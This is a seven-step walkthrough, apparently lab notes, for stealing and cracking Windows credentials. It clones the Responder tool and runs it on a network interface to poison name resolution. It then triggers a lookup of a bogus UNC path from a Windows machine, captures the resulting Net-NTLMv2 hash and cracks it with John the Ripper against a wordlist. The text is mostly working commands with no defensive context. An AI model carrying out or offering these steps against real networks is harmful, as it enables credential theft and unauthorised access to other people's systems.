1. Download responder - git clone https://github.com/lgandx/Responder
2. Run the responder tool - ./responder -I interface
3. Create a search error from the windows machine - \\hsadfhusfdj
4. Extract the Net-NTLMv2 hash from the responder tool
5. Copy the Net-NTLMv2 hash into a file
6. Create a wordlist that contain the client password
7. Use JohnTheRipper to crack the hash - john --format=netntlmv2 [hash file] --wordlist=[wordlist file]